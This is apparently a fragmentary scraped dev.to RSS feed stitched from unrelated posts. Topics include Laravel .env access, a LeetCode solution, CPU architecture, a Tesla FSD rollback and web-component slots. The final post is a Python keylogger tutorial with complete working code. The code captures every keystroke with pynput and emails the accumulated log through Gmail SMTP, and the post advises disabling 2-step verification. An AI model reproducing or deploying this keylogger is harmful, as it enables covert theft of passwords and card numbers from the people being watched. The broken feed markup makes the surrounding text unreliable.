      <description>&lt;h2&gt;&lt;strong&gt;Who is an Ethical Hacker?&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;An ethical hacker is a computer network specialist who deals with the security posture of an organization. His job involves eliciting security flaws in the organization he is working for by testing all aspects of the system and its services for any sort of vulnerabilities. The key point to notice is that all this is done with the permission of the owners of the organization and without any malicious intent. An ethical hacker is also known as a white hat hacker and is the stark opposite of a black hat hacker, a.k.a crackers who hack with the sole purpose of bringing about some sort of disruption, or chaos from the vulnerabilities they find. &lt;/p&gt;

      <guid>https://dev.to/baenencalin/chromium-console-stopped-working-whats-wrong-hod-do-i-fix-it-1a8e</guid>
      <description>&lt;p&gt;Recently, after it working for a while, the console in Chromium gave-out, as in doesn't work.&lt;br&gt;
Pressing &lt;code&gt;ctrl+i&lt;/code&gt;, &lt;code&gt;ctrl+shift+j&lt;/code&gt;, or &lt;code&gt;f12&lt;/code&gt; doesn't work. I tried pressing the three-dots, then to "Developer tools"&lt;sup&gt;under "More tools"&lt;/sup&gt; manually, but pressing that option doesn't work, nor does "Inspect" in the default content menu work.&lt;br&gt;
The options aren't grayed out (at least not that I can tell), but nothing happens, and I'm not notified of any errors.&lt;/p&gt;

&lt;p&gt;I'm on Arch Linux + KDE Plasma, with x86_64 archt.&lt;br&gt;
Extra details:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Chromium Version: 95.0.4638.54 (Official Build) Arch Linux (64-bit)

      <title>Laravel How to Get .env Variable in Controller and Blade</title>
      <author>Techsolutionstuff</author>
      <pubDate>Mon, 25 Oct 2021 03:14:11 +0000</pubDate>
      <link>https://dev.to/techsolutionstuff/laravel-how-to-get-env-variable-in-controller-and-blade-4d2h</link>
      <guid>https://dev.to/techsolutionstuff/laravel-how-to-get-env-variable-in-controller-and-blade-4d2h</guid>
      <description>&lt;p&gt;In this tutorial I will give you information laravel how to get .env variable in controller and blade. many time we need to required of .env variable in controller and blade file like if you are creating google map integration then you have stored app id and secret key in env file. But if you haven't any idea how to get it in controller or blade file. You can also set app URL and many other things on .env file.&lt;/p&gt;

&lt;p&gt;So, let's check how to get those variable data from .env file.&lt;/p&gt;

&lt;p&gt;Syntax :&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;env('VARIABLE_NAME');
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Example :  &lt;/p&gt;

&lt;p&gt;just put the same line in your .env file.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Google_API_Key=XXXXX
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Access set variable in .env file using env() function.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;env('Google_API_Key');
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Blade file&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;@if(env('APP_ENV') == 'local')
   Match
@endif
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Controller&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;if(env('APP_ENV') == 'local')
{ 
  echo 'Match';
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;So, it is very simple to get variable data from .env file like this.&lt;/p&gt;

      <description>&lt;p&gt;&lt;strong&gt;--DAY 7--&lt;/strong&gt;&lt;br&gt;
Hi, I am going to make #100DaysOfCode Challenge. Everyday I will try solve 1 problem from leetcode or hackerrank. Hope you can go with me until end.&lt;br&gt;
&lt;strong&gt;Now let's solve problem today:&lt;/strong&gt;&lt;br&gt;
-Problem: Remove Element&lt;br&gt;
-Detail: &lt;a href="https://leetcode.com/problems/remove-element/"&gt;https://leetcode.com/problems/remove-element/&lt;/a&gt;&lt;br&gt;
-My solution (javascript):&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;var removeElement = function(nums, val) {
    let i=0;
    for(let j=0;j&amp;lt;nums.length;j++)
        if(nums[j]!=val){
            nums[i]=nums[j];
            i++;
        }
    return i;
};
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;--&amp;gt;&lt;em&gt;If you have better solution or any question, please comment below. I will appreciate.&lt;/em&gt;&lt;/p&gt;

      <title>I created my first NPM package</title>
      <author>Jason F </author>

      <guid>https://dev.to/juniordevforlife/i-created-my-first-npm-package-245m</guid>
      <description>&lt;p&gt;Hello all! I am excited to announce that I have published my first NPM package. It's not super fancy or anything and is most certainly a work in progress. That being said, if anyone has time to check it out and provide feedback, &lt;a href="https://www.npmjs.com/package/gedate"&gt;here is the link&lt;/a&gt;. The library provides useful methods when working with dates in JavaScript/TypeScript. I wrote it in TypeScript, so you get type declarations right out of the box. &lt;/p&gt;

&lt;p&gt;I'd appreciate any feedback. Also, if you want to contribute, just let me know :)&lt;/p&gt;

&lt;p&gt;This has definitely been a learning experience for me. I live in my own little world as a front end developer. I install and use npm packages but never really considered that anyone can write one and publish it. &lt;/p&gt;

      <title>CPU Architecture - What's inside?</title>
      <author>Ben Lyon</author>
      <pubDate>Mon, 25 Oct 2021 00:53:17 +0000</pubDate>
      <link>https://dev.to/carlbenjaminlyon/cpu-architecture-whats-inside-514f</link>
      <guid>https://dev.to/carlbenjaminlyon/cpu-architecture-whats-inside-514f</guid>
      <description>&lt;p&gt;&lt;em&gt;Let's talk about CPU's and their inner workings.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;A CPU, the central processing unit, is the brain of your computer. It is the core hub which performs all operations of your device, and is responsible for performing arithmetic, providing instruction logic, and controlling the input and output operations as specified by that instruction logic. The rules surrounding its design fall into the field of CPU architecture design, in which are described the functionality, organization, and implementation of the internal systems. These definitions extend to instruction set design, microarchitecture design, and logic design.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Wheels, Levers, and Cogs&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Long prior to the AMD Big Red vs the Intel Big Blue Wars, a notable and early development in exploration of computational units was provided by the work of Charles Babbage. A British mathematician and mechanical engineer, Babbage originated the idea of a digital programming computer, in which the principal ideas of all modern computers can be found in his proposed 'Analytical Engine'. While the 'Analytical Engine' never was fully realized due to arguments over design and withdrawal of government funding, it provided outline of the arithmetic logic unit - a unit capable of control-flow in the form of conditional branching and loops. This design allowed the system to be 'Turing-Complete', meaning that the system was able to recognize and decide upon use of other data-manipulation rule sets, based on the currently processing data. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--tYnWUJ_N--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8rb5defci8yi5hqw33jw.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--tYnWUJ_N--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8rb5defci8yi5hqw33jw.png" alt="Image description"&gt;&lt;/a&gt;I wasn't kidding when I said cogs.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Modern, Defined&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;While CPU architecture has drastically changed and improved over the years, it was John von Neumann, Hungarian-American computer scientist and engineer who gave it's first real set of requirements. The following basic requirements are present in all modern-day CPU designs:&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;1. A processing unit which contains an arithmetic logic unit (ALU) and processing pipeline (instruction feed)
2. Processor registers for quick access to required data (Read-Only Memory and Random Access Memory)
3. A control unit that contains an instruction register and program counter
4. Memory that stores data and instructions
5. A location for external mass storage of data
6. Input and Output mechanisms
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--gl2PIG3b--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/f00j98tyfakjkcyos0oi.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--gl2PIG3b--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/f00j98tyfakjkcyos0oi.png" alt="Image description"&gt;&lt;/a&gt;John von Neumann and a visual representation of modern CPU design requirements.&lt;/p&gt;

&lt;p&gt;This set of basic requirements provides large-scale capability to treat instructions as data. This capability is what makes assemblers, compilers, and other automated programming tools possible - the tool that makes "programs that write programs" possible. These programs provide the system the capability to manipulate and manage data at runtime, which is a principal element of modern programming high-level languages, such as Java, Node.js, Swift, C++ to name a few.  &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;What does this mean today?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Today, modern CPU architecture design has fairly straight-forward goals, revolving around performance, power efficiency, and cost.&lt;br&gt;
Although CPU's still follow the same fundamental operations as their predecessors, the additional structure implementations provide more capability in a smaller and faster package. A few notable named structures and concepts that we enjoy today are parallelism, memory management units, CPU cache, voltage regulation, and increased integer range capability. These additional structures provide the ability to run multiple functions at the same time in a way similar to hyperthreading, give faster access to often used data, provide additional memory capacity, and give the CPU extra juice at critical times to perform process-intensive tasks. &lt;/p&gt;

&lt;p&gt;While Big Red and Big Blue may fight for the top of the hill, they each contain the same elements which give us the speed and capability which we enjoy today. &lt;/p&gt;

      <guid>https://dev.to/ben/tesla-pushes-out-dangerous-software-update-bungles-rollback-attempt-5hl4</guid>
      <description>&lt;p&gt;There are a lot of headlines about Tesla that overstate a story for clicks, and I can assure you this is not one of them.&lt;/p&gt;

&lt;p&gt;Before I'm accused of being a hater: I am a Tesla owner and shareholder. I'm no Elon Musk fanboy, but I definitely root on Tesla's environmentally-driven mission of &lt;a href="https://www.tesla.com/about"&gt;accelerating the world’s transition to sustainable energy&lt;/a&gt;. I'll also say that I personally hope this does not result in reactionary regulation of autonomous driving software in the USA because current rules seem reasonable and I don't necessarily trust that changes would happen in good faith.&lt;/p&gt;

&lt;p&gt;And major hugops to all the developers and admins doing their best with all of this — I'm posting this on DEV because it's an interesting software story that deserves attention, not to be critical of the engineering teams. They strike me as very misssion-driven over there, and are generally doing incredible things.&lt;/p&gt;

&lt;p&gt;With all that said, this was a doozy...&lt;/p&gt;

&lt;p&gt;Here's what went down:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Tesla was set to release FSD Beta 10.3 on Friday night. &lt;a href="https://twitter.com/elonmusk/status/1451907229796417542"&gt;It gets delayed due to regressions&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Rollout happens Saturday night.&lt;/li&gt;
&lt;li&gt;Sunday morning, many customers (who all opted in to the beta) experience a variety of problems: &lt;a href="https://www.reddit.com/r/TeslaLounge/comments/qf16dx/while_in_manual_driving_my_car_emergency_braked/"&gt;Most alarmingly — swerving into adjacent lane while FSD is &lt;em&gt;not&lt;/em&gt; enabled&lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;Tesla tries to &lt;a href="https://twitter.com/elonmusk/status/1452345284483235841"&gt;rollback to version 10.2&lt;/a&gt;, but accidentally &lt;a href="https://twitter.com/chazman/status/1452346661259419652"&gt;rolls back to some other build&lt;/a&gt; without FSD enabled at all.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I am one of the customers with the FSD beta myself. I am out of town, but my wife described a pretty scary scene that fits in alongside the reports from the rest of the users.&lt;/p&gt;

&lt;p&gt;Rolling back software is generally always easier said than done, but that doesn't act as an excuse for a company building software which is fundamentally unsafe if buggy.&lt;/p&gt;

      &lt;/a&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/blockquote&gt;


&lt;p&gt;Tesla certainly &lt;em&gt;gives off the impression&lt;/em&gt; of a company that rides some of their software teams to meet absurd deadlines, work through the weekends, and generally work to exhaustion: That is the story I've gotten from anyone I've met who works in Tesla or SpaceX engineering. They definitely hire for people who are passionate about the mission and self-select for the journey, but that kind of culture tends to drive these kinds of mistakes.&lt;/p&gt;

&lt;p&gt;At the end of the day, mistakes happen, but failure to communicate effectively has consistently caused frustration between Tesla and its customers/users. Tesla &lt;a href="https://electrek.co/2020/10/06/tesla-dissolves-pr-department/"&gt;no longer has a PR team&lt;/a&gt;, which is fine in and of itself, but this is an organization that &lt;em&gt;badly&lt;/em&gt; needs to delegate its communication strategy over matters like this. Not to a PR department per se, but a trusted leader within the organization who can communicate directly.&lt;/p&gt;

&lt;p&gt;Tesla is not exactly opaque. They are remarkably transparent in many ways, but these problems hurt their mission and they need to level up. If they are going to be rolling out beta software and pushing a lot of good things forward at a great pace, they need to learn from this — starting at the top.&lt;/p&gt;

&lt;p&gt;Happy coding ❤️&lt;/p&gt;

      <title>Using slot with custom web componnents.</title>
      <author>spb5732</author>
      <pubDate>Mon, 25 Oct 2021 00:31:15 +0000</pubDate>
      <link>https://dev.to/spb5732/using-slot-with-custom-web-componnents-493j</link>
      <guid>https://dev.to/spb5732/using-slot-with-custom-web-componnents-493j</guid>
      <description>&lt;p&gt;when creating custom web components the slot tag can be very useful. The slot tag allows you to pass html content into the shadowroot of your custom element.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#when-would-you-use-the-slot-tag"&gt;
  &lt;/a&gt;
  When would you use the slot tag?
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;An example of when I have had to use the slot tag was when I was coding my custom web component learning card.
-The card had a body section that needed to have support for any html content.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#slimecard"&gt;
  &lt;/a&gt;
  slime-card:
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--raPzLCtl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ky3n80l44sqpspkciqtj.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--raPzLCtl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ky3n80l44sqpspkciqtj.gif" alt="Image description"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#how-to-use-slot"&gt;
  &lt;/a&gt;
  How to use slot.
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;If you have a blank slot any content will be passed from inside the custom element into the blank slot.&lt;/li&gt;
&lt;li&gt;If you have a named slot you need to pass the slot attribute with the correct name into the html content.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#examples-below"&gt;
  &lt;/a&gt;
  examples below:
&lt;/h3&gt;

&lt;h1&gt;
  &lt;a href="#indexhtml"&gt;
  &lt;/a&gt;
  index.html
&lt;/h1&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;
&amp;lt;custom-web-component&amp;gt;

&amp;lt;span&amp;gt;This will be put into the blank slot&amp;lt;/span&amp;gt;

&amp;lt;/custom-web-component&amp;gt;


&amp;lt;custom-web-component&amp;gt;

&amp;lt;span slot="s1"&amp;gt;This will be put into s1 slot!&amp;lt;/span&amp;gt;

&amp;lt;/custom-web-component&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h1&gt;
  &lt;a href="#customwebcomponentjs"&gt;
  &lt;/a&gt;
  custom-web-component.js
&lt;/h1&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;render(){ return hml`
&amp;lt;div id="custom-web-component"&amp;gt;
&amp;lt;slot&amp;gt;&amp;lt;/slot&amp;gt;
&amp;lt;slot name="s1"&amp;gt;&amp;lt;/slot&amp;gt;
&amp;lt;/div&amp;gt;`;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the slot tag allows you to pass html content into a custom web component. It also makes it really easy to pass content from the top level of a web component down to the bottom level. This makes alot of sense when you break down a custom web component into smaller sub components.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#for-example"&gt;
  &lt;/a&gt;
  For example
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;The learning card was broken down into icon, header, body , and card as a whole&lt;/li&gt;
&lt;li&gt;When using the card as a whole, info can be passed from the slot of the card as a whole into the slot for the body component. This allows custom web components to be very flexible.&lt;/li&gt;
&lt;/ul&gt;

      <title>How I build python keylogger </title>
      <author>arinzejustinng</author>
      <pubDate>Mon, 25 Oct 2021 00:28:44 +0000</pubDate>
      <link>https://dev.to/arinzejustinng/how-i-build-python-keylogger-i8k</link>
      <guid>https://dev.to/arinzejustinng/how-i-build-python-keylogger-i8k</guid>
      <description>&lt;p&gt;&lt;strong&gt;A&lt;/strong&gt; &lt;em&gt;keylogger&lt;/em&gt; is a type of surveillance technology used to monitor and record each keystroke typed on a specific computer's keyboard. In this tutorial, you will learn how to write a &lt;em&gt;keylogger&lt;/em&gt; in Python.&lt;/p&gt;

&lt;p&gt;You are maybe wondering, why a &lt;em&gt;keylogger&lt;/em&gt; is useful ? Well, when a hacker uses this for unethical purposes, he/she will gather information of everything you type in the keyboard including your credentials (credit card numbers, passwords, etc.).&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#first-we-gonna-need-to-install-a-module-called-pynput-go-to-the-terminal-or-the-command-prompt-and-write"&gt;
  &lt;/a&gt;
  First, we gonna need to install a module called pynput, go to the terminal or the command prompt and write:
&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;pip3 install pynput&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This module allows you to take full control of your keyboard, hook global events, register hotkeys, simulate key presses and much more.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#let-us-start-by-import-the-necessary-modules"&gt;
  &lt;/a&gt;
  Let us start by import the necessary modules:
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;  import logging #for logging to a file
  import smtplib #for sending email using SMTP protocol (gmail)

  from pynput.keyboard import Key, Listener #for keylogs
  from random import randint #for generating random file name
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If you are to report key logs via email, then you should set up a Gmail account and make sure that:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Less secure app access is ON.&lt;/li&gt;
&lt;li&gt;2-Step Verification is OFF.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2&gt;
  &lt;a href="#generate-the-logging-file"&gt;
  &lt;/a&gt;
  Generate the logging file:
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;output = '3ke' + str(randint(0, 10000)) + '.txt'

log_dir = ""

logging.basicConfig(filename=(log_dir + output), level=logging.DEBUG, format='%(asctime)s: %(message)s')

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#setup-email-that-receives-the-keystrokes"&gt;
  &lt;/a&gt;
  Setup email that receives the keystrokes
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;email = 'your@gmail.com'
password = 'password'
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

full_log = ""
word = ""
email_char_limit = 60 #set how many charcters to store before sending 

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#the-code-that-append-the-key-that-is-press-and-save-"&gt;
  &lt;/a&gt;
  The code that append the key that is press and save :
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;def on_press(key, false=None):
    global word
    global full_log
    global email
    global email_char_limit
    logging.info(str(key))

    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) &amp;gt;= email_char_limit:
            send_log()
            full_log = ''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char

    if key == Key.esc:
        return false 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#the-code-that-sends-the-append-keys-that-is-press-"&gt;
  &lt;/a&gt;
  The code that sends the append keys that is press :
&lt;/h2&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )

with Listener(on_press=on_press) as listener:
    listener.join()
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#my-first-coding-using-python"&gt;
  &lt;/a&gt;
  My first coding using python
&lt;/h2&gt;
